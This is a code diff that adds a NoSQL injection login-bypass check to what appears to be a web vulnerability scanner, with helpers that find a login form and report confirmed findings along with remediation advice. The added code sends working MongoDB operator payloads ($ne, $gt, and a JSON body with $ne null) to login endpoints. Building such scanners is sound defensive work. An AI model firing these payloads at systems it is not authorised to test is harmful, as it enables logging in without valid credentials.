@@ -356,6 +356,73 @@ def _scan_debug(ip: str, port: Port, base: str, auth) -> list[Vuln]:
     return out
 
 
+def _find_login_form(ip: str, port: Port, body: str, auth):
+    """Locate a login form (root page or a common login path). Returns (form, action)."""
+    for cand_body, cand_path in [(body, "/")] + [(None, p) for p in _LOGIN_PATHS]:
+        html = cand_body
+        if html is None:
+            r = _fetch(ip, port, cand_path, auth=auth)
+            if not r or r[0] != 200:
+                continue
+            html = r[2]
+        if "password" not in html.lower():
+            continue
+        f = _parse_form(html, cand_path)
+        if f.get("password"):
+            f["values"] = _form_values(html)
+            action = f.get("action") or cand_path
+            return f, (action if action.startswith("/") else "/" + action.lstrip("./"))
+    return None, None
+
+
+def _scan_nosql(ip: str, port: Port, base: str, body: str, auth) -> list[Vuln]:
+    """NoSQL (MongoDB-style) authentication bypass: submit operator payloads to the
+    login form and confirm a login the wrong-credential baseline didn't get. A few
+    login POSTs, lockout-aware; self-skips when there's no login form."""
+    form, action = _find_login_form(ip, port, body, auth)
+    if not form:
+        return []
+    userf, passf = _login_fields(form)
+    if not userf or not passf:
+        return []
+    hidden = form.get("values") or {}
+
+    def _urlenc(data):
+        return _fetch(ip, port, action, method="POST", body=urlencode(data),
+                      auth={"Content-Type": "application/x-www-form-urlencoded"})
+
+    def _win(r):
+        return bool(r) and (r[0] in (301, 302, 303) or not _looks_logged_out(r))
+
+    bad = _urlenc({**hidden, userf: "recce_zz_u", passf: "recce_zz_p"})
+    if not _looks_logged_out(bad):        # can't tell a login apart -> don't guess (FP guard)
+        return []
+
+    def mk(kind, detail):
+        return [_mk(ip, port, "web-nosqli", "critical",
+                    f"NoSQL injection authentication bypass ({kind})", ["CWE-943", "CWE-287"],
+                    detail, "Cast auth inputs to strings; reject operator objects; validate "
+                    "types server-side (schema/whitelist).", confidence="confirmed")]
+
+    # 1) bracket/array operator (Express/PHP query-string parsers -> object).
+    for op, val in (("$ne", "recce"), ("$gt", "")):
+        r = _urlenc({**hidden, f"{userf}[{op}]": val, f"{passf}[{op}]": val})
+        if _win(r):
+            return mk("operator injection",
+                      f"POST {base}{action} with {userf}[{op}]={val!r} & {passf}[{op}]="
+                      f"{val!r} logged in with no valid credentials - bracket-parsed input "
+                      "reaches a NoSQL query operator.")
+    # 2) JSON operator body.
+    r = _fetch(ip, port, action, method="POST",
+               body=json.dumps({**hidden, userf: {"$ne": None}, passf: {"$ne": None}}),
+               auth={"Content-Type": "application/json"})
+    if _win(r):
+        return mk("JSON operator injection",
+                  f"POST {base}{action} with a JSON body {{{userf}:{{$ne:null}}, "
+                  f"{passf}:{{$ne:null}}}} logged in with no valid credentials.")
+    return []
+
+
 def _scan_git_dump(ip: str, port: Port, auth: dict | None, findings: list) -> list:
     """Reconstruct an exposed .git over HTTP: recover the tracked source tree, mine the
     recovered files for secrets/credentials, and emit a web-git-dump finding. Returns the
@@ -2228,6 +2295,8 @@ def scan_endpoint(ip: str, port: Port, active: bool = True,
     # Deep dives (each self-gates so they cost nothing when absent).
     findings.extend(_scan_actuator(ip, port, base, auth))
     findings.extend(_scan_debug(ip, port, base, auth))
+    if active:
+        findings.extend(_scan_nosql(ip, port, base, body, auth))
     findings.extend(_scan_backups(ip, port, base, auth))
     findings.extend(_scan_reflection(ip, port, base, auth))
     findings.extend(_scan_js(ip, port, base, body, auth))
